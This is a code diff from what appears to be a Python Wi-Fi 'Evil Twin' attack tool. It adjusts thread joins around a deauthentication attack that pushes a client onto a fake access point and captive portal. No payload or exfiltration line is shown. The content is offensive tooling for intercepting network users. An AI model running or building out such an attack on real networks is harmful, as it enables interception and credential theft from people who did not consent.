@@ -184,9 +184,6 @@ def main():
                                         print(f"[*] Using {deauth_interface} for deauth attacks")
                                         print("[*] Client should reconnect to our fake AP on wlan0")
 
-                                        sniff_thread.join()
-                                        network.stop_sniffing()
-
                                         dauth.start_attack(client_mac, target_bssid, deauth_interface, ONE_MINUTE_SCAN)
 
                                         # Wait for attack with progress
@@ -197,10 +194,7 @@ def main():
                                         print("\n")
 
                                         dauth.stop_attack()
-                                        sniff_thread.start()
                                         print("[✓] Deauth completed!")
-
-                                        portal_thread.join()
 
                                     # Keep running until user stops
                                     input("\nPress Enter to stop Evil Twin and return to scanning...")
@@ -208,7 +202,6 @@ def main():
                                     # Stop Evil Twin (cleanup AP, try to free portal)
                                     print("[*] Stopping Evil Twin...")
                                     try:
-                                        ap_thread.join()
                                         fake_ap.cleanup()
                                     except Exception as e:
                                         print(f"[!] Error during AP cleanup: {e}")
